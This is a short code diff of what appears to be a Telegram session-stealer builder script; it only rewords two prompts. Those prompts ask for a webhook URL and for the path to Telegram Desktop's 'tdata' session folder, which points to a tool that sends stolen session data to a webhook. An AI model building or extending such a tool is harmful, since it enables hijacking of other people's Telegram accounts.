@@ -67,13 +67,13 @@ def main():
                                                                                                      ░                                  """
     print(logo)
 
-    hook = input("Enter web hook url (hook): ")
+    hook = input("[Enter web hook url]: ")
 
 
     default_user = r'home, AppData\\Roaming\\Telegram Desktop\\tdata'
     
 
-    user = input(f"Enter path to tdata or press ENTER for default path [{default_user}]: ")
+    user = input(f"[Enter path to tdata or press ENTER for default path [{default_user}]]: ")
 
 
     if not user:
